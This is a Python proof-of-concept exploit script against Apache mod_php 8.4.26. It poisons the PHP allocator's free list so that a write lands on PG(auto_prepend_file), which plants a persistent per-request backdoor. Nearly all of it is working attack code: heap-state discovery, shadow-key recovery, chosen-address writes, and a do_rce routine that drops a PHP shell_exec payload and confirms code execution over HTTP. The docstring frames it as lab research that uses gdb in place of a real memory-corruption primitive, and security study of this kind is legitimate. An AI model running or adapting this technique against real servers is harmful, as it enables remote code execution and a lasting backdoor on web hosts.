#!/usr/bin/env python3
r"""ZendMM free-list next_free_slot poison on APACHE mod_php 8.4.26 (libphp.so),
aimed at PG(auto_prepend_file) for a persistent per-request backdoor.

On Apache the request-heap chunk sits ~44 MiB below libphp.so, out of reach of
the chunk-forward single-write CVE primitive (~16 KiB cap). The free-list poison
removes the reach problem: the poison is chunk-local, but the address the next
emalloc returns is a value we choose, so emalloc hands back a chosen libphp
address T and an ordinary write into that allocation lands at T. Pointing T at
PG(auto_prepend_file) (libphp_base+core_globals+0xa0) turns one write into a
per-request RCE (id as www-data, observed over HTTP). The shadow key is recovered
offset-free from one chunk-local read; the libphp anchor is /proc-seeded in lab.

RESEARCH: the allocator mechanism is proven against the live libphp allocator by
driving its exported _emalloc/_efree/zend_mm_get_heap through the in-container gdb
instrument, which stands in for a chunk-local CVE write that deposits the poison
(no such Apache write primitive exists yet - the structural wall). gdb detaches
before the RCE is observed over HTTP. Not a black-box landed RCE. Pure stdlib,
python3 -I safe. Lab use, systems you own.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/


def _load(name, filename):
    path = os.path.join(_HERE, filename)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    for _p in (_HERE, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    sys.modules.setdefault(name, mod)
    spec.loader.exec_module(mod)
    return mod


# Read-only reuse: the proven shadow math + gdb plumbing + /proc Maps, and the
# Apache PG(auto_prepend_file) offsets table.
F = _load("freelist_slot_poison", "primitives/write/freelist_slot_poison.py")
PGP = _load("auto_prepend_persist", "primitives/dispatch/auto_prepend_persist.py")

MASK64 = F.MASK64
BIN_DATA_SIZE = F.BIN_DATA_SIZE            # 320
SHADOW_OFFSET = F.SHADOW_OFFSET            # 312
CHUNK_ALIGN = F.CHUNK_ALIGN                # 0x200000
DEFAULT_ALLOC_SIZE = F.DEFAULT_ALLOC_SIZE  # 280 -> bin 320

# This avenue uses the grouped docker-compose.apache-avenues.yml under the
# `apfl` profile, isolated as project `p2s-apfl`. The compose plumbing is
# fpm_freelist_poison._compose_exec (shells out `docker compose -f <compose_file>
# exec ...`); the project name and profile reach those inherited subprocesses
# through the environment set below (the env-equivalent of
# `-p p2s-apfl --profile apfl`).
#   bring-up: docker compose -f docker-compose.apache-avenues.yml -p p2s-apfl \
#              --profile apfl up -d --build
os.environ["COMPOSE_PROJECT_NAME"] = "p2s-apfl"
os.environ["COMPOSE_PROFILES"] = "apfl"

DEFAULT_COMPOSE = os.path.join(os.path.dirname(os.path.dirname(_HERE)),
                               "docker-compose.apache-avenues.yml")
DEFAULT_SERVICE = "apfl-apache"

# pg_persist APACHE 8.4.26 offsets (libphp.so, NTS trixie -- zif_system-verified).
APACHE_OFF = PGP.APACHE_8426_OFFSETS
AUTO_PREPEND_OFF = APACHE_OFF["auto_prepend_off"]   # 0x132c6a0
PG_SCRATCH_OFF = APACHE_OFF["pg_scratch_off"]       # 0x1333500 (.bss slack)
FORWARD_CAP = F.FORWARD_CAP                    # ~16 KiB


# Apache worker discovery + libphp base (the fpm helpers are fpm-pool-specific)
def apache_worker_pids(compose_file, service):
    """Return the www-data prefork child PIDs (the request-serving workers); the
    root master is excluded."""
    out = F._compose_exec(compose_file, service, "sh", "-c",
                          "ps -eo pid,user,args | grep apache2 | grep -v grep",
                          user_root=False)
    pids = []
    for line in out.splitlines():
        parts = line.split(None, 2)
        if len(parts) < 3 or not parts[0].isdigit():
            continue
        pid, user = int(parts[0]), parts[1]
        if user == "root":          # the master
            continue
        pids.append(pid)
    return sorted(pids)


def libphp_base(maps):
    """Load base of libphp.so = start of its first (r--p, off 0) mapping."""
    for x in maps.rows:
        if x["path"].endswith("libphp.so") and x["off"] == "00000000":
            return x["start"]
    # fallback: lowest libphp.so mapping
    libs = [x["start"] for x in maps.rows if x["path"].endswith("libphp.so")]
    return min(libs) if libs else None


# The Apache free-list poison driver (chunk-local poison -> far libphp write)
class ApacheFreeListPoison:
    def __init__(self, compose_file=DEFAULT_COMPOSE, service=DEFAULT_SERVICE,
                 size=DEFAULT_ALLOC_SIZE, verbose=False):
        self.compose_file = compose_file
        self.service = service
        self.size = size
        self.verbose = verbose
        # Delegate the proven primitives to the fpm driver (service-generic).
        self._flp = F.FreeListPoison(compose_file, service, size=size,
                                     verbose=verbose)

    # -- warm + discover ----------------------------------------------------
    def workers(self):
        return apache_worker_pids(self.compose_file, self.service)

    def heap_of(self, pid):
        return self._flp.heap_of(pid)

    def read_shadow_key(self, pid):
        return self._flp.read_shadow_key(pid)

    def poison_alloc(self, pid, head, target, key, **kw):
        return self._flp.poison_alloc(pid, head, target, key, **kw)

    def layout(self, pid):
        heap = self.heap_of(pid)
        chunk = (heap & ~(CHUNK_ALIGN - 1)) if heap else None
        maps = F.read_maps(self.compose_file, self.service, pid)
        base = libphp_base(maps)
        return {"heap": heap, "chunk": chunk, "binbase": base, "maps": maps}

    # -- the general poison -> far write (arbitrary-length body) -------------
    def poison_write_bytes(self, pid, head, target, key, data: bytes,
                           prezero=True):
        """Poison the bin-head so the next emalloc installs `target`, the emalloc
        after that RETURNS target, then write `data` (any length) into the
        returned allocation via one memcpy -- the faithful stand-in for a PHP
        string-body / scalar store into that allocation. Returns a result dict
        incl. the chosen-return flag, worker-alive flag, and an 8-byte readback."""
        _prev = self._flp.verbose
        self._flp.verbose = False
        try:
            res = self._flp.poison_alloc(pid, head, target, key, writeback=data,
                                         prezero_target=prezero,
                                         writeback_full=True)
        finally:
            self._flp.verbose = _prev
        if self.verbose:
            print(f"  [pwrite] pid={pid} T={target:#x} q2={res['q2'] and hex(res['q2'])}"
                  f" chosen={res['returned_chosen']} alive={res['alive']}"
                  f" rb={res['readback'] and hex(res['readback'])}")
        return res


# Mechanism demonstration (no persistent change unless --rce)
def demonstrate(compose_file, service, size=DEFAULT_ALLOC_SIZE, verbose=True):
    drv = ApacheFreeListPoison(compose_file, service, size=size, verbose=verbose)
    pids = drv.workers()
    if not pids:
        raise RuntimeError("no apache workers (is the lab up? curl the front once)")
    pid = pids[0]

    rep = {"workers": pids, "target_pid": pid, "size": size,
           "bin_data_size": BIN_DATA_SIZE, "shadow_offset": SHADOW_OFFSET}

    rk = drv.read_shadow_key(pid)
    if rk is None:
        raise RuntimeError(f"could not read a bin-{BIN_DATA_SIZE} slot on pid {pid}")
    key, head, nxt, shadow = rk
    rep["shadow_key"] = key
    rep["model_decode_ok"] = (F.decode_shadow(shadow, key) == nxt)

    lay = drv.layout(pid)
    chunk, base = lay["chunk"], lay["binbase"]
    rep["heap"], rep["chunk"], rep["binbase"] = lay["heap"], chunk, base

    # (A) far chunk-local target, well past the single-write 16 KiB forward cap.
    far_chunk = chunk + 0x180000
    rep["far_chunk_target"] = far_chunk
    rep["far_chunk_distance"] = far_chunk - head
    rep["far_chunk"] = drv.poison_alloc(pid, head, far_chunk, key,
                                        writeback=b"P2SAPFLA")

    # (B) PG(auto_prepend_file) in libphp .bss -- the aim the single-write cannot reach.
    rep["pg"] = None
    if base:
        pg_addr = base + AUTO_PREPEND_OFF
        rep["pg_addr"] = pg_addr
        rep["pg_distance"] = abs(pg_addr - chunk)
        rk2 = drv.read_shadow_key(pid)          # bin head was NULLed by the pop
        if rk2:
            key, head, _, _ = rk2
        rep["pg"] = drv.poison_alloc(pid, head, pg_addr, key, writeback=b"P2SAPFLB")
    return rep, drv


# End-to-end RCE via the free-list poison -> PG(auto_prepend_file) (opt-in)
PAYLOAD_PATH = "/tmp/p2s_apfl_prepend.php"
PAYLOAD_PHP = ("<?php echo \"P2S-APFL-RCE[\".trim(@shell_exec('id')).\"]\\n\"; ?>")
RCE_MARK = "P2S-APFL-RCE["


def do_rce(compose_file, service, port, size=DEFAULT_ALLOC_SIZE, verbose=True):
    import subprocess
    drv = ApacheFreeListPoison(compose_file, service, size=size, verbose=verbose)
    pids = drv.workers()
    if not pids:
        raise RuntimeError("no apache workers up")
    pid = pids[0]

    # Place the prepend payload on disk (readable by the worker). This stands in
    # for the attacker-dropped include target pg_persist assumes (upload/tmp).
    # base64 the bytes so no shell quoting can mangle the PHP source.
    import base64
    b64 = base64.b64encode(PAYLOAD_PHP.encode()).decode()
    F._compose_exec(compose_file, service, "sh", "-c",
                    f"echo {b64} | base64 -d > {PAYLOAD_PATH}; chmod 644 {PAYLOAD_PATH}",
                    user_root=True)

    lay = drv.layout(pid)
    base, chunk = lay["binbase"], lay["chunk"]
    if not base:
        raise RuntimeError("libphp base not found in maps")
    scratch = base + PG_SCRATCH_OFF
    pg_addr = base + AUTO_PREPEND_OFF
    print(f"[rce] worker pid={pid} libphp_base={base:#x} chunk={chunk:#x}")
    print(f"[rce] scratch(.bss)={scratch:#x}  PG(auto_prepend_file)={pg_addr:#x}"
          f"  ({F._human(abs(pg_addr - chunk))} fwd of chunk)")

    # Poison #1: emalloc -> scratch; write the NUL-terminated path string there.
    rk = drv.read_shadow_key(pid)
    key, head, _, _ = rk
    path_bytes = PAYLOAD_PATH.encode() + b"\x00"
    r1 = drv.poison_write_bytes(pid, head, scratch, key, path_bytes)
    print(f"[rce] step1 str-into-scratch: chosen={r1['returned_chosen']} "
          f"alive={r1['alive']}")

    # Poison #2: emalloc -> PG(auto_prepend_file); write the scratch address.
    rk = drv.read_shadow_key(pid)
    key, head, _, _ = rk
    r2 = drv.poison_write_bytes(pid, head, pg_addr, key,
                                scratch.to_bytes(8, "little"))
    ok_ptr = (r2["readback"] == scratch)
    print(f"[rce] step2 ptr-into-PG: chosen={r2['returned_chosen']} "
          f"alive={r2['alive']} PG->scratch={ok_ptr}")

    # Follow-up HTTP request on the (now-detached) Apache front: the worker reads
    # PG(auto_prepend_file) per request and auto-includes our payload FIRST.
    url = f"http://127.0.0.1:{port}/"
    out = subprocess.run(["curl", "-s", "-m", "10", url],
                         capture_output=True).stdout.decode("utf-8", "replace")
    got = RCE_MARK in out
    print(f"[rce] follow-up GET {url} ->")
    for line in out.splitlines():
        if RCE_MARK in line or "apfl-warm" in line:
            print(f"        {line.strip()}")
    verdict = bool(r1["returned_chosen"] and r2["returned_chosen"] and ok_ptr and got)
    print(f"[rce] VERDICT: {'RCE via free-list poison -> PG(auto_prepend_file)' if verdict else 'did not fire'}")
    # best-effort cleanup: clear PG so the lab worker returns to normal.
    try:
        rk = drv.read_shadow_key(pid)
        if rk:
            key, head, _, _ = rk
            drv.poison_write_bytes(pid, head, pg_addr, key, (0).to_bytes(8, "little"))
    except Exception:
        pass
    return verdict


def print_report(rep):
    P = print
    P("=" * 78)
    P("ZendMM free-list poison -> libphp -- Apache mod_php 8.4.26 (workers %s)"
      % rep["workers"])
    P("=" * 78)
    P("alloc size      : %d  -> bin_data_size=%d, shadow at slot+%d"
      % (rep["size"], rep["bin_data_size"], rep["shadow_offset"]))
    P("target worker   : pid %s" % rep["target_pid"])
    P("shadow_key      : %#018x  (recovered from ONE controlled freed slot;"
      % rep["shadow_key"])
    P("                   no zend_mm_heap struct offset needed)")
    P("model vs live   : decode(shadow)==next ? %s" % rep["model_decode_ok"])
    P("heap / chunk    : heap=%#x  chunk=%#x" % (rep["heap"] or 0, rep["chunk"] or 0))
    P("libphp base     : %s" % (("%#x" % rep["binbase"]) if rep["binbase"] else "n/a"))
    P("-" * 78)
    r = rep["far_chunk"]
    P("(A) FAR CHUNK aim : T=%#x  (%s forward of the groom slot)"
      % (rep["far_chunk_target"], F._human(rep["far_chunk_distance"])))
    P("    emalloc returned chosen T : %s   q2=%s"
      % (r["returned_chosen"], r["q2"] and hex(r["q2"])))
    P("    worker survived           : %s" % r["alive"])
    P("    write-back read           : %s" % (r["readback"] and hex(r["readback"])))
    P("    vs var_hash_rw ~16 KiB cap         : %s past the cap"
      % ("FAR" if rep["far_chunk_distance"] > FORWARD_CAP else "within"))
    if rep.get("pg"):
        r = rep["pg"]
        P("-" * 78)
        P("(B) PG(auto_prepend_file): T=%#x  (%s FORWARD of chunk -- var_hash_rw CANNOT cross)"
          % (rep["pg_addr"], F._human(rep["pg_distance"])))
        P("    emalloc returned chosen T : %s   q2=%s"
          % (r["returned_chosen"], r["q2"] and hex(r["q2"])))
        P("    worker survived           : %s" % r["alive"])
        P("    write-back read           : %s" % (r["readback"] and hex(r["readback"])))
    P("=" * 78)


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="ZendMM free-list poison -> libphp feasibility (apache 8.4.26)")
    ap.add_argument("--compose-file", default=DEFAULT_COMPOSE)
    ap.add_argument("--service", default=DEFAULT_SERVICE)
    ap.add_argument("--port", type=int, default=8164, help="host port of the Apache front")
    ap.add_argument("--size", type=int, default=DEFAULT_ALLOC_SIZE)
    ap.add_argument("--rce", action="store_true",
                    help="run the end-to-end poison -> PG(auto_prepend_file) -> RCE demo")
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args(argv)

    if a.rce:
        ok = do_rce(a.compose_file, a.service, a.port, size=a.size)
        return 0 if ok else 1

    rep, _ = demonstrate(a.compose_file, a.service, size=a.size)
    if a.json:
        import json
        print(json.dumps(rep, indent=2, default=lambda o: hex(o) if isinstance(o, int) else o,
                         skipkeys=True))
    else:
        print_report(rep)
    ok = rep["far_chunk"]["returned_chosen"] and rep["far_chunk"]["alive"]
    if rep.get("pg"):
        ok = ok and rep["pg"]["returned_chosen"] and rep["pg"]["alive"]
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
